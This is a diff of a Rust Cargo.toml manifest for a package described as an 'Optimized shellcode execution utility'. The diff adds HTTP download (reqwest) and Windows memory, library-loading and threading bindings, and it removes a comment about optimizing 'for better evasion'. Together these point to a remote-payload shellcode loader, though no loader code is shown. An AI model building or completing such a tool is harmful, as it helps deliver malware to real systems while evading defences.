@@ -1,16 +1,20 @@
 [package]
-name = "rust-runner"
+name = "rust-run"
 version = "0.1.0"
 edition = "2021"
-
-[[bin]]
-name = "decoder_test"
-path = "src/decoder_test.rs"
+description = "Optimized shellcode execution utility"
 
 [dependencies]
-reqwest = { version = "0.11", features = ["blocking"] }
+reqwest = { version = "0.11", features = ["blocking", "rustls-tls"] }
+windows-sys = { version = "0.48", features = [
+    "Win32_Foundation",
+    "Win32_System_Memory", 
+    "Win32_System_LibraryLoader", 
+    "Win32_System_Threading"
+] }
+log = "0.4"
+env_logger = "0.10"
 
-# Enable optimizations for better evasion
 [profile.release]
 opt-level = 3
 lto = true
